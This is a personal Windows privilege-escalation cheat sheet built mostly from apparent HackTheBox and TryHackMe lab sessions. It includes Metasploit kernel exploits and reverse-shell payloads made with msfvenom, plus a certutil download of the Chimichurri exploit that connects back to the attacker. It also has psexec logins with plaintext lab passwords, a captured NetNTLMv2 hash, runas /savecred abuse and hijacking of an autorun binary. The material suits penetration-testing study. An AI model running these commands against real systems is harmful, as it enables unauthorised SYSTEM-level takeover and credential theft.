Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.412 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.491 MB
Virtual Memory: In Use:    650 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::aca4:dfd8:19d8:70b2
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
─# python2 ./windows-exploit-suggester.py --update							
# how to update windows-exploit-suggester
[*] initiating winsploit version 3.3...
[+] writing to file 2023-01-14-mssb.xls
[*] done
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
meterpreter > cd  c:\\windows\\temp											
# how to upload winPEAS to victim machine through meterpreter shell.
meterpreter > upload /home/kali/Documents/transfer/winPEASx86.exe
[*] uploading  : /home/kali/Documents/transfer/winPEASx86.exe -> winPEASx86.exe
[*] Uploaded 1.88 MiB of 1.88 MiB (100.0%): /home/kali/Documents/transfer/winPEASx86.exe -> winPEASx86.exe
[*] uploaded   : /home/kali/Documents/transfer/winPEASx86.exe -> winPEASx86.exe

###########################################################################################################		ESCALATION PATH: KERNEL EXPLOITS		###########################################################################################################

/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\		KERNEL EXPLOITS OVERVIEW		/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\ 

Windows Kernel Exploits - https://github.com/SecWiki/windows-kernel-exploits

/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\		ESCALATION WITH METASPLOIT		/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\ 

														#PICKING UP FROM EXPLORING WITH AUTOMATED TOOLS SECTION
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 167 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 
 meterpreter > background																												# BACKGROUNDING SESSION THAT IS ON VICTIM MACHINE WITH MULTI/HANDLER
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > 

msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d																# TRYING KITRAPOD
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > 

msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 2																			#SETTING SESSION TO RUN OFF OF (SESSION 2 IS THE SESSION RUNNING THE REVERSE_TCP PAYLOAD ON THE VICTIM BOX)
session => 2
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0																			# SETTING LHOST IP
lhost => tun0
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555																			# SETTING LPORT 
lport => 5555
msf6 exploit(windows/local/ms10_015_kitrap0d) > options																					# SHOWING OPTIONS

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > 

msf6 exploit(windows/local/ms10_015_kitrap0d) > run																						# RUNNING EXPLOIT

[*] Started reverse TCP handler on 10.10.16.21:5555 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2544 launched.
[*] Reflectively injecting the DLL into 2544...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.16.21:5555 -> 10.10.10.5:49160) at 2023-01-15 18:38:42 -0500

meterpreter > getuid																													# SHOWING PRIVILEGES
Server username: NT AUTHORITY\SYSTEM																									# GOT SYSTEM PRIVILEGES
meterpreter > shell																														# DROPPING INTO SHELL
Process 3532 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami													
whoami
nt authority\system

/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\		MANUAL KERNEL EXPLOITATION		/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\/\/\\/\/\/\/\/\/\/\/\/\/\ 

┌──(root㉿kali)-[/home/kali/Documents/transfer/msfvenom]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.21 LPORT=5555 -f aspx > manual.aspx										
#Creating manual payload, !note the windows/shell_reverse_tcp


─# ftp 10.10.10.5																													# CONNECTING TO VULNERABLE  FTP MACHINE
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
ftp> put manual.aspx																												# PUTTING MSFVENOM PAYLOAD ON MACHINE.
local: manual.aspx remote: manual.aspx
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|  2892       42.43 MiB/s    --:-- ETA
226 Transfer complete.
2892 bytes sent in 00:00 (9.98 KiB/s)
ftp> 

┌──(root㉿kali)-[/home/kali]																											# IN NEW WINDOW start listener
└─# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.5] 49176
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami																									# on machine
whoami
iis apppool\web

c:\windows\system32\inetsrv>systeminfo																								#sysinfo the victim machines details and save on kali machine under same location as wesng
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          16/1/2023, 12:01:13 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.458 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.518 MB
Virtual Memory: In Use:    623 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::4062:6d43:f859:82fb
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

c:\windows\system32\inetsrv>

┌──(root㉿kali)-[/home/kali/Documents/transfer/wesng]																				# plaxing vistim sysinfo into same directory as wesng
└─# gedit sysinfo.txt        


┌──(root㉿kali)-[/home/kali/Documents/transfer/wesng]																				# updated windows-exploit-suggester-next-generation
└─# python wes.py --update

┌──(root㉿kali)-[/home/kali/Documents/transfer/wesng]																				# running script and throwing into develhtb.txt
└─# python wes.py sysinfo.txt > develhtb.txt

	Windows Exploit Suggester 1.03 ( https://github.com/bitsadmin/wesng/ )															# list of results
	[+] Parsing systeminfo output
	[+] Operating System
		- Name: Windows 7 for 32-bit Systems
		- Generation: 7
		- Build: 7600
		- Version: None
		- Architecture: 32-bit
		- Installed hotfixes: None
	[+] Loading definitions
		- Creation date of definitions: 20230111
	[+] Determining missing patches
	[!] Found vulnerabilities!

	Date: 20130409
	CVE: CVE-2013-1283
	KB: KB2840149
	Title: Vulnerabilities in Kernel-Mode Driver Could Allow Elevation Of Privilege
	Affected product: Windows 7 for 32-bit Systems
	Affected component: 
	Severity: Important
	Impact: Elevation of Privilege
	Exploit: n/a

	Date: 20130409
	CVE: CVE-2013-1291
	KB: KB2840149
	Title: Vulnerabilities in Kernel-Mode Driver Could Allow Elevation Of Privilege
	Affected product: Windows 7 for 32-bit Systems
	Affected component: 
	Severity: Important
	Impact: Elevation of Privilege
	Exploit: n/a

	Date: 20130409
	CVE: CVE-2013-1292
	KB: KB2840149
	Title: Vulnerabilities in Kernel-Mode Driver Could Allow Elevation Of Privilege
	Affected product: Windows 7 for 32-bit Systems
	Affected component: 
	Severity: Important
	Impact: Elevation of Privilege
	Exploit: n/a


c:\Windows\Temp>certutil -urlcache -f http://10.10.16.21:8000/Chimichurri.exe ms.exe									#pulling file from kali box and putting on victim machine
certutil -urlcache -f http://10.10.16.21:8000/Chimichurri.exe ms.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Windows\Temp

16/01/2023  02:57 ��    <DIR>          .
16/01/2023  02:57 ��    <DIR>          ..
17/03/2017  01:10 ��                 0 DMI20C8.tmp
28/12/2017  01:44 ��                 0 DMI4069.tmp
13/12/2020  12:22 ��               140 fwtsqmfile00.sqm
13/12/2020  12:59 ��               140 fwtsqmfile01.sqm
15/01/2023  07:17 ��         6.635.326 lazagne.exe
15/01/2023  07:14 ��               469 LaZagne.py
15/01/2023  02:46 ��             5.702 MpCmdRun.log
17/03/2017  04:32 ��             5.194 MpSigStub.log
16/01/2023  02:57 ��           784.384 ms.exe																			# showing that file is now on system.
15/01/2023  09:27 ��            27.136 PrintSpoofer.exe
18/03/2017  01:04 ��    <DIR>          rad11098.tmp
18/03/2017  01:06 ��    <DIR>          rad18A66.tmp
18/03/2017  01:06 ��    <DIR>          rad3ED74.tmp
18/03/2017  01:06 ��    <DIR>          rad5167A.tmp
18/03/2017  01:02 ��    <DIR>          rad578E0.tmp
18/03/2017  01:02 ��    <DIR>          rad87630.tmp
18/03/2017  01:07 ��    <DIR>          radB60EF.tmp
18/03/2017  01:02 ��    <DIR>          radB7E46.tmp
18/03/2017  12:58 ��    <DIR>          radC91EC.tmp
18/03/2017  01:02 ��    <DIR>          radCC0AF.tmp
18/03/2017  01:00 ��    <DIR>          radCFF96.tmp
17/03/2017  01:12 ��           180.224 TS_91C4.tmp
17/03/2017  01:12 ��           196.608 TS_952F.tmp
17/03/2017  01:12 ��           360.448 TS_95BC.tmp
17/03/2017  01:12 ��           638.976 TS_96C6.tmp
17/03/2017  01:12 ��            98.304 TS_989B.tmp
17/03/2017  01:12 ��            98.304 TS_9909.tmp
17/03/2017  01:12 ��           409.600 TS_99A6.tmp
17/03/2017  01:12 ��           180.224 TS_A0E8.tmp
17/03/2017  01:12 ��           114.688 TS_A57B.tmp
10/12/2020  07:54 ��        23.210.428 vminst.log
10/12/2020  08:00 ��    <DIR>          vmware-SYSTEM
16/01/2023  12:01 ��           139.960 vmware-vmsvc.log
11/02/2022  04:30 ��            45.752 vmware-vmusr.log
16/01/2023  12:01 ��             1.974 vmware-vmvss.log
15/01/2023  07:30 ��            69.175 windowssuggest.py
15/01/2023  07:23 ��            35.292 winpeas.bat
15/01/2023  04:55 ��         1.969.152 winPEASx64.exe
16/01/2023  12:56 ��         1.969.664 winPEASx86.exe
              27 File(s)     37.177.264 bytes
              14 Dir(s)   4.448.546.816 bytes free

c:\Windows\Temp>ms.exe																															# showing exploit and using it
ms.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>
c:\Windows\Temp>ms.exe 10.10.16.21 5555
ms.exe 10.10.16.21 5555



┌──(root㉿kali)-[/home/kali/Downloads]																						# opening listening port on machine
└─# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.21] from (UNKNOWN) [10.10.10.5] 49190
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>whoami
whoami
nt authority\system																												# on system, gained roote access.


┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# smbclient -L \\\\10.10.10.74 -U 'Alfred' 
Password for [WORKGROUP\Alfred]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.74 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# smbmap -u Alfred -p Welcome1! -H 10.10.10.74    
[+] IP: 10.10.10.74:445	Name: 10.10.10.74                                       
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC


┌──(root㉿kali)-[/home/kali/Documents/hackthebox/Chatterbox]
└─# winexe -U Administrator%Welcome1! //10.10.10.74 "cmd.exe"											# had to coninuously hit enter and eventually got shell with winexe - smb 445





Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\administrator

┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbclient \\\\10.10.10.97\\new-site -U tyler                                        				#smbclient example
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 16 19:05:53 2023
  ..                                  D        0  Mon Jan 16 19:05:53 2023
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

		7736063 blocks of size 4096. 3314039 blocks available
smb: \> 

###########################################################################################################		ESCALATION PATH: SUBSYSTEM FOR LINUX		###########################################################################################################

 /\/\\/\/\/\/\/\/\/\/\/\/\		ESCALATION VIA WSL		/\/\\/\/\/\/\/\/\/\/\/\/\	
 
C:\ where /R c:\windows bash.exe								# looks for bash.exe
C:\ where /R c:\windows wsl.exe									# looks for wsl.exe
C:\ wsl.exe whoami												#typically owned by root
C:\	bash.exe 													# running bash.exe to get into linux sub system.
python -c "import pty;pty.spawn('/bin/bash')"					# now in a root shell.

┌──(root㉿kali)-[/opt/impacket/impacket]																				# had to git clone  https://github.com/fortra/impacket.git in order to use psexec
└─# psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97														#psexec walkthrough.
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file bXHYxAcr.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service yFaM on 10.10.10.97.....
[*] Starting service yFaM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system

C:\WINDOWS\system32> 


┌──(root㉿kali)-[/opt/impacket/impacket]																				# try smbexec as well as psexec
└─# smbexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[-] SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
                                                                                               

┌──(root㉿kali)-[/opt/impacket/impacket]
└─# wmiexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97														# try wmi exec as well - TRY ALL 3!
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
whoami
[-] Could not connect: timed out


┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# smbserver.py TMP /home/kali/Documents/transfer -smb2support														#smbserver
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49723)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:9a25d72550efe541bdb22826e523d8be:01010000000000000030440f082bd90121eaa5efa6f4b5600000000001001000560064007500660049006a004600490003001000560064007500660049006a0046004900020010006f00560056007a005900450046007a00040010006f00560056007a005900450046007a00070008000030440f082bd90106000400020000000800300030000000000000000000000000300000f4c8f1f67dc5cd4c3ba7309936d0fd20256daf74e7f4e195366f1972a53963a70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003100000000000000000000000000
[*] Connecting Share(1:TMP)
[*] Disconnecting Share(1:TMP)
[*] Closing down connection (10.10.10.63,49723)
[*] Remaining connections []
^CTraceback (most recent call last):
  File "/usr/local/bin/smbserver.py", line 105, in <module>
    server.start()
  File "/usr/local/lib/python3.10/dist-packages/impacket/smbserver.py", line 4889, in start
    self.__server.serve_forever()
  File "/usr/lib/python3.10/socketserver.py", line 232, in serve_forever
    ready = selector.select(poll_interval)
  File "/usr/lib/python3.10/selectors.py", line 416, in select
    fd_event_list = self._selector.poll(timeout)
KeyboardInterrupt



###########################################################################################################	IMPERSONATION & POTATO ATTACKS	###########################################################################################################

 /\/\\/\/\/\/\/\/\/\/\/\/\		TOKEN IMPERSONATION OVERVIEW		/\/\\/\/\/\/\/\/\/\/\/\/\	
 
What are tokens?
	- Temporary keys that   allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
	
Two types:
	- Delegate: Created for logging into a machine or using Remote Desktop * what we're mostly going to see*
	- Impersonate: "non-interactive" such as attaching a network drive or a domain logon script.
	
 /\/\\/\/\/\/\/\/\/\/\/\/\	 IMPERSONATION PRIVILEGES OVERVIEW		/\/\\/\/\/\/\/\/\/\/\/\/\	
		
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges

		SeAssignPrimaryToken	Admin	3rd party tool	"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe" # SAME AS IMPERSONATE
		

 /\/\\/\/\/\/\/\/\/\/\/\/\	 POTATO ATTACKS OVERVIEW		/\/\\/\/\/\/\/\/\/\/\/\/\	
 
 Rotten Potato - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
 
 Juicy Potato - https://github.com/ohpe/juicy-potato
 
 https://github.com/ohpe/juicy-potato
 
 
																														#METASPLOIT POTATO ATTACK EXAMPLE
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to
                                       listen on. This must be an address on t
                                       he local machine or 0.0.0.0 to listen o
                                       n all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (defau
                                       lt is randomly generated)
   URIPATH                   no        The URI to use for this exploit (defaul
                                       t is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be s
                                     pecified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python


msf6 exploit(multi/script/web_delivery) > show targets										#METASPLOIT, PSH. POWERSHELL

Exploit targets:

   Id  Name
   --  ----
   0   Python
   1   PHP
   2   PSH
   3   Regsvr32
   4   pubprn
   5   SyncAppvPublishingServer
   6   PSH (Binary)
   7   Linux
   8   Mac OS X


msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse__tcp
[-] The value specified for payload is not valid.
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost 10.10.16.21
lhost => 10.10.16.21
msf6 exploit(multi/script/web_delivery) > set srvhost 10.10.16.21
srvhost => 10.10.16.21
msf6 exploit(multi/script/web_delivery) > run																									# at this point a payload will be generated, copy and paste into victim machine and should be good to go


 /\/\\/\/\/\/\/\/\/\/\/\/\	 Alternate Data Streams		/\/\\/\/\/\/\/\/\/\/\/\/\	
 
 dir /RA																																					# how to look deeper
 more < hm.txt:root.txt:$DATA					


 ###########################################################################################################	Escalation  path: getsystem	###########################################################################################################
 
 meterpreter > getsystem				#gets system in 3 different ways, 0 runs all techniques, 1 makes a pipe in memmory to becaome system, 2 does the same thing as one but actually on disk which means AV can catch, 3 takes advantage of the SEDebugPrivilege
 
	https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

 ###########################################################################################################	Escalation  path: RunAs	#######################################################################################
 
C:\Users\security>cmdkey /list																							# see if theres stored credentials on machine to runas administrator (windows equivalent of sudo) 

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    

C:\Users\security>C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"					# successful runas

C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

01/19/2023  05:13 AM                34 root.txt
               1 File(s)             34 bytes
              14 Dir(s)   3,342,446,592 bytes free

C:\Users\security>

 ###########################################################################################################	Escalation  path: Registry	###########################################################################################################
 
  /\/\\/\/\/\/\/\/\/\/\/\/\	 Overview of Autoruns	/\/\\/\/\/\/\/\/\/\/\/\/\	

https://tryhackme.com/room/windowsprivescarena

++Detection++

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.		## looking for file all access


PowerUp
run powerup in cmd.exe
powershell -ep bypass
..\PowerUp.ps1
Invoke-AllChecks



C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

[*] Running Invoke-AllChecks

[*] Checking for modifidable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files
                 \Autorun Program\program.exe; IdentityReference=Everyone}

  /\/\\/\/\/\/\/\/\/\/\/\/\	 Escalation viaAutoruns	/\/\\/\/\/\/\/\/\/\/\/\/\	
  
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.13.125 lport=4444 -f exe -o program.exe 
	#lport is 4444 by default	#the payload is generating a payload named program.exe using the windows/meterpreter/reverse_tcp shell and supplies the lhost.
	
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.13.13.125
lhost => 10.13.13.125
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.13.125:4444 

┌──(root㉿kali)-[/home/kali/Documents/transfer]								# moving program.exe to transfer dir
└─# mv /home/kali/program.exe .         

┌──(root㉿kali)-[/home/kali/Documents/transfer]								# hosting http server to puit on windows machine
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

http://10.13.13.125:8000/		# on windows machine in internet explorer window go to this address to download program.exe
								#C:\Program Files\Autorun Program - saving program.exe into this location which was the previous location of the original program.exe running program
								# disconnect rdesktop through windows start menu and login as windows administrator user
								#login as TCM:Hacker123 and when prompted to run program.exe say yes
								
msf6 exploit(multi/handler) > run	# now on meterpreter machine now we have a shell

[*] Started reverse TCP handler on 10.13.13.125:4444 
[*] Sending stage (175686 bytes) to 10.10.66.169
[*] Meterpreter session 1 opened (10.13.13.125:4444 -> 10.10.66.169:49262) at 2023-01-19 22:15:08 -0500

meterpreter > getuid
Server username: TCM-PC\TCM
meterpreter > 


/\/\\/\/\/\/\/\/\/\/\/\/\	AlwaysInstallElevated Overview and Escalation /\/\\/\/\/\/\/\/\/\/\/\/\	

++Detection++

Windows VM

1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer

	C:\Users\user>reg query HKLM\Software\Policies\Microsoft\Windows\Installer

	HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer						# 1 is on, 0 is off
		AlwaysInstallElevated    REG_DWORD    0x1

2.From the output, notice that “AlwaysInstallElevated” value is 1.
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer

	C:\Users\user>reg query HKCU\Software\Policies\Microsoft\Windows\Installer

	HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
